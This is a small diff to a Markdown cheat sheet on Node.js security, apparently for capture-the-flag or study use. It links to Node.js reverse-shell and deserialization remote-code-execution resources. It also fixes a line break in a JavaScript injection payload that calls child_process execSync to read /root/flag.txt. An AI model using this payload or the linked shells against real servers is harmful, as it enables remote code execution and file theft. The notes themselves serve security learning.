@@ -12,8 +12,6 @@
 [Shell](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)
 [Node.js Reverse shells](https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73)
 
-
-
 ## Deserialization
 
 [Deserialization](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) blog
@@ -30,8 +28,7 @@ require()
 
 ## Node.js Payload
 ```javascript
-"return process.mainModule.require('child_process').execSync('cat
-/root/flag.txt');"
+"return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"
 ```
 
 ## Vulnerable Require() 
